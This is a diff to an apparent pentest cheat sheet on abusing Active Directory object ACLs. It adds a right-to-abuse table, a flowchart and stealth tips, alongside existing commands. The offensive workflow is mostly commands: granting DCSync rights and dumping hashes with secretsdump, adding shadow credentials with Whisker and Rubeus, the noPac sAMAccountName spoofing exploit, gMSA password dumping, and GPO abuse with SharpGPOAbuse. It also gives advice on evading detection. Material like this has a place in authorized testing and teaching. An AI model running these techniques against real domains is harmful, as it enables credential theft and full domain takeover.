@@ -4,6 +4,45 @@
 
 Abusing object ACEs: password resets, targeted kerberoast, DCSync rights, shadow credentials, logon scripts, SPN jacking, sAMAccountName spoofing, GPO abuse. Related: [enumeration](enumeration.md) · [kerberos-delegation](kerberos-delegation.md) · [kerberos-tickets](kerberos-tickets.md) · [ntlm-relay](ntlm-relay.md)
 
+## Contents
+- [Enumerate ACLs](#enumerate-acls)
+- [Abusing Rights (Windows)](#abusing-rights-windows)
+- [Abusing Rights (Linux)](#abusing-rights-linux)
+- [Shadow Credentials (msDS-KeyCredentialLink)](#shadow-credentials-msds-keycredentiallink)
+- [Logon Scripts (scriptPath)](#logon-scripts-scriptpath)
+- [SPN Jacking](#spn-jacking)
+- [sAMAccountName Spoofing (noPac / CVE-2021-42278/42287)](#samaccountname-spoofing-nopac--cve-2021-4227842287)
+- [GPO Abuse](#gpo-abuse)
+
+## Abuse Path by ACE Right
+
+| Right Held | Abuse | Section |
+|---|---|---|
+| `GenericAll` / `ForceChangePassword` | Force a password reset on the target | [Abusing Rights (Windows)](#abusing-rights-windows) |
+| `GenericAll` / full control (write) | Grant yourself rights, add to group, reset password, read LAPS | [Abusing Rights (Linux)](#abusing-rights-linux) |
+| `WriteOwner` | Take ownership of the object, then grant further rights | [Abusing Rights (Linux)](#abusing-rights-linux) |
+| `DS-Replication-Get-Changes[-All]` (grantable) | Grant DCSync rights to a controlled principal | [Abusing Rights (Linux)](#abusing-rights-linux) · [dcsync](dcsync.md) |
+| Write to `msDS-KeyCredentialLink` | Add "shadow credentials" (a certificate) and authenticate as the target via PKINIT | [Shadow Credentials](#shadow-credentials-msds-keycredentiallink) |
+| Write to `scriptPath` | Plant a logon script that executes as the target on next interactive logon | [Logon Scripts](#logon-scripts-scriptpath) |
+| `WriteSPN` (self or targeted) | Assign an SPN, Kerberoast it, or combine with S4U for ticket forging | [SPN Jacking](#spn-jacking) |
+| High `ms-DS-MachineAccountQuota` + noPac bug | Create/rename a machine account to collide with the DC's, impersonate via PAC | [sAMAccountName Spoofing](#samaccountname-spoofing-nopac--cve-2021-4227842287) |
+| GPO edit rights / link rights | Push a malicious GPO (local admin, scheduled task) to linked OUs | [GPO Abuse](#gpo-abuse) |
+
+## ACL Abuse Flow
+
+```mermaid
+flowchart TD
+    A["Get-DomainObjectAcl -ResolveGUIDs / dacledit.py"] --> B{What right do I hold?}
+    B -->|GenericAll / ForceChangePassword| C["Set-DomainUserPassword (reset target's password)"]
+    B -->|WriteOwner| D["owneredit.py -action write (take ownership)"] --> E["Grant self further rights (e.g. DCSync)"]
+    B -->|Write DS-Replication-Get-Changes| F["dacledit.py -action write -rights DCSync"] --> G["secretsdump.py -just-dc (see dcsync.md)"]
+    B -->|Write msDS-KeyCredentialLink| H["Whisker.exe / pywhisker.py add"] --> I["Rubeus asktgt /certificate or gettgtpkinit.py"] --> J["getnthash.py → NT hash"]
+    B -->|Write scriptPath| K["Set-DomainObject -Set scriptPath"] --> L["Target executes script on next logon"]
+    B -->|WriteSPN| M["Set-DomainObject serviceprincipalname"] --> N["targetedKerberoast.py / Rubeus s4u"]
+    B -->|High MachineAccountQuota| O["New-MachineAccount (PowerMad)"] --> P["Set-MachineAccountAttribute samaccountname"] --> Q["noPac exploit → impersonate DC"]
+    B -->|GPO edit/link rights| R["SharpGPOAbuse.exe / pygpoabuse.py"] --> S["Local admin or SYSTEM on linked OU's computers"]
+```
+
 ## Enumerate ACLs
 ```powershell
 $userSID = ConvertTo-SID jose
@@ -88,6 +127,13 @@ python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u user -p Passwor
 Read all gMSA passwords (gMSADumper).
 
 ## Shadow Credentials (msDS-KeyCredentialLink)
+
+> [!TIP]
+> Shadow credentials work on both user and computer objects and don't require resetting the target's password — a stealthier alternative to `Set-DomainUserPassword` when you only need a one-shot auth, since the original password stays valid and unchanged.
+
+<details>
+<summary>Full Shadow Credentials workflow (Windows + Linux)</summary>
+
 ```powershell
 Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'
 ```
@@ -127,6 +173,8 @@ Extract the NT hash from the TGT.
 KRB5CCNAME=<CCACHE_FILE> smbclient.py -k -no-pass <DC>
 ```
 Connect to a share using the TGT (Impacket).
+
+</details>
 
 ## Logon Scripts (scriptPath)
 ```bash
@@ -171,6 +219,13 @@ Set-DomainObject -Identity <TARGET> -Clear 'serviceprincipalname' -Verbose
 Clear an SPN from a target (PowerView).
 
 ## sAMAccountName Spoofing (noPac / CVE-2021-42278/42287)
+
+> [!CAUTION]
+> This path requires creating/renaming a machine account and relies on a specific unpatched DC — it's a destructive, high-signal technique. Confirm the DC is actually vulnerable with the scanner before attempting exploitation, and expect it to be flagged by any EDR watching for sAMAccountName changes on computer objects.
+
+<details>
+<summary>Full noPac workflow (Windows + Linux)</summary>
+
 ```cmd
 .\noPac.exe scan -domain <DOMAIN> -user <USER> -pass <PASSWORD>
 ```
@@ -200,6 +255,8 @@ Scan for noPac from Linux.
 getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
 ```
 Request a TGT (Impacket).
+
+</details>
 
 ## GPO Abuse
 ```powershell
